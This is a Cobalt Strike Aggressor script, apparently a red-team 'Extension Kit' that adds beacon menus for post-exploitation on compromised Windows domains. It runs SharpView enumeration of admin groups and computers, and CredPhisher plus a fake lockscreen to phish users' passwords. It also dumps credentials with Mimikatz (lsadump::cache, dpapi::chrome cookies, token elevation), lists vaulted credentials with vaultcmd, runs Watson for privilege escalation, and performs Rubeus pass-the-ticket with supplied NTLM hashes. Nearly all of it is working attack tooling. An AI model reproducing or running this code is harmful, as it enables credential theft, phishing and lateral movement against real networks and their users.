####################################################

##Define the pop up menu name

##

####################################################



popup beacon_top {

	menu "Extension Kit" {





####################################################

##List All Items in Pop Up Menu

##

####################################################



menu "Domain Group Enumeration"

{

########List Groups in Domain##################

		item "Enterprise Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupenterpriseadmin($bid);

				}

			}

			

		item "Domain Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupdomainadmin($bid);

				}

			}

			

		item "Schema Admin"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupschemaadmin($bid);

				}

			}

		

		item "Account Operator"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupaccountoperator($bid);

				}

			}

					

			

		item "Administrator"{

			local('$bid');

				foreach $bid ($1){

					getnetgroupadministrator($bid);

				}

			}

			

##########################################################################################End of menu			

}



menu "Domain User Enumeration"

{

########List People in Domain##################

					

		item "List Admins in Domain"{

			local('$bid');

				foreach $bid ($1){

					getnetuseradmin($bid);

				}

			}

}


##############################################################################End of Menu


menu "Phishing Users"

{

########Run CredPhisher##################

					

		item "Prompt for Username and Password"{

			local('$bid');

				foreach $bid ($1){

					credphisher($bid);

				}

			}

		

			

########Run Lock Screen Phishing Exploit##################

					

		item "Show Lockscreen to Phish Password"{

			local('$bid');

				foreach $bid ($1){

					lockscreen($bid);

				}

			}

		

}


##############################################################################End of Menu

menu "Privilege Escalation"

{

	

########Run Watson by Rastamouse##################

					

		item "Run Watson to find missing patches"{

			local('$bid');

				foreach $bid ($1){

					escalateprivs($bid);

				}

			}

		



}


##############################################################################End of Menu


menu "Domain Computer Object Enumeration"

{

	

########List computers in Domain##################

					

		item "List Computers"{

			local('$bid');

				foreach $bid ($1){

					getdomaincomputer($bid);

				}

			}

		



}


##############################################################################End of Menu


menu "Domain/Forest Enumeration"

{

########List Domains/Forest in Domain##################

					

		

########Get Domain Security Identifier (SID)#######

		item "List Domain SID"{

			local('$bid');

				foreach $bid ($1){

					getdomainsid($bid);

					}

				}

}


##############################################################################End of Menu



menu "Trust"

########List Trust in Domain##################

{					

	

}


##############################################################################End of Menu


menu "Pass The Ticket"
{
	item "Pass Ticket"{

			local('$bid');

				foreach $bid ($1){

					passticket($bid);

					}

				}
}


##############################################################################End of Menu


#################
##
##This section is dedicated to credential extraction and Kerberos goodies
##
##
#################

					
menu "Credentials and Kerberos"

{

	

########Triage Tickets##################

					

		item "List Current Kerberos Tickets AKA Triage"{

			local('$bid');

				foreach $bid ($1){

					rubeustriage($bid);

				}

			}

		item "List Cached Credentials AKA lsadump::cache"{

			local('$bid');

				foreach $bid ($1){

					lsadumpcache($bid);

				}

			}
			
		item "Vaulted Cred AKA vaultcmd Windows Creds"{

			local('$bid');

				foreach $bid ($1){

					windowsvaultcmd($bid);

				}

			}

		item "Vaulted Cred AKA vaultcmd Web Creds"{

			local('$bid');

				foreach $bid ($1){

					webvaultcmd($bid);

				}

			}
			
		item "Steal Chrome Creds AKA dpapi::chrome"{

			local('$bid');

				foreach $bid ($1){

					dpapichrome($bid);

				}

			}
			
		item "List Tokens with Mimikatz"{

			local('$bid');

				foreach $bid ($1){

					listtokens($bid);

				}

			}
			

		item "Elevate your token with mimikatz"{

			local('$bid');

				foreach $bid ($1){

					elevatetoken($bid);

				}

			}			



}


	

	









################

## These last two brackets close out the above functions

##

##

################

		}

	}

  


##############################################################################End of All Menus




####################################################Begin Defining Variables for functions




###########################

##Define variables for functions e.g., sub

##

###########################



########################### Elevate Token with Mimikatz

sub elevatetoken{



bmimikatz($1, "token::elevate");



}



########################### Mimikats Steal Tokens



sub listtokens{



bmimikatz($1, "token::list");



}



##########################Steal Chrome Creds

sub dpapichrome{



bmimikatz($1, "dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies");


}


##########################Steal Web Credentials from Vault

sub webvaultcmd{



brun($1, 'vaultcmd.exe /listcreds:"Web Credentials" /all');



}


##########################Steal Windows Credentials from Vault


sub windowsvaultcmd{



brun($1, 'vaultcmd.exe /listcreds:"Windows Credentials" /all');



}


##########################Mimikatz steal cached credentials

sub lsadumpcache{



bmimikatz($1, "lsadump::cache");



}


##########################Use Rubeus to Triage Kerberos Tickets

sub rubeustriage{



bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");



}



########################## SharpView get current domain's SID

sub getdomainsid{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");



}


########################## SharpView Get Domain Computers



sub getdomaincomputer{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer");



}



########################## SharpView List Admin Users

sub getnetuseradmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -AdminCount");



}



########################## SharpView list Enterprise Admins



sub getnetgroupenterpriseadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Enterprise Admins" -Recursive');



}



########################## SharpView list Domain Admins



sub getnetgroupdomainadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');



}


########################## SharpView list Schema Admins



sub getnetgroupschemaadmin{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Schema Admins" -Recursive');



}


########################## SharpView list account operators



sub getnetgroupaccountoperator{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Account Operators" -Recursive');



}



########################## SharpView list Administrators group


sub getnetgroupadministrator{



bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');



}



########################## Phish Users with small pop up box

sub credphisher{



bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');



}



########################## Phish Users with fake lockscreen


sub lockscreen{



bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));



}


########################## Run Watson to find missing patches

sub escalateprivs{



bexecute_assembly($1, script_resource('/exe/Watson.exe'));



}


########################## Pass the ticket

sub passticket{
 # beacon ID
    $bid = $1;
    
 # command arugement variable  
    $cmdargs = "";
  
 # Pop Dialog Box and control flow
    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
 
 # manipulate the first argument depending on the executables command line switch statements
 # manipulate the second argument depending on the expected input format  
        foreach $key => $value ($3){
            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
                $cmdargs .= ' /';
                $cmdargs .= $key;
                $cmdargs .= ':';
                $cmdargs .= $value.' ';
            }
 # manipulate the first argument depending on the executables command line switch statements            
            else if ($value eq "true"){
                $cmdargs .= ' /';
                $cmdargs .= $key;
            }
        }
 # btask just displays message in beacon window
 # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
       if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), 'asktgt'.$cmdargs.''."/ptt");
        }
      
    }));
    
 # Dialog box contents and text boxes mapped to command line argument keys   
    dialog_description($dialog, "**Think with your Tickets, Jimmy!** Use the FQDN for the Domain input!");
    drow_text($dialog, "user",  "User");
    drow_text($dialog, "rc4",  "RC4/NTLM");
    drow_text($dialog, "domain",  "FQ Domain Name");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);

}

